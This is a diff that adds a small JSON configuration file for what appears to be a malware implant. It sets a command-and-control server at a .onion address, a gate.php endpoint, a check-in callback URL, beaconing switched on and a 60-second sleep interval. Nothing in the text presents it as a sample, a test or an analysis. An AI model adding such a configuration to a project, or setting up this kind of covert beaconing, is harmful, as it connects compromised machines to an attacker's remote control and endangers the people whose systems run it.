@@ -1,0 +1,7 @@
+{
+  "c2_server": "http://u5sdaz67mvk3yrwx.onion",
+  "url": "http://u5sdaz67mvk3yrwx.onion/gate.php",
+  "beacon": true,
+  "callback": "http://u5sdaz67mvk3yrwx.onion/checkin",
+  "sleep": 60
+}
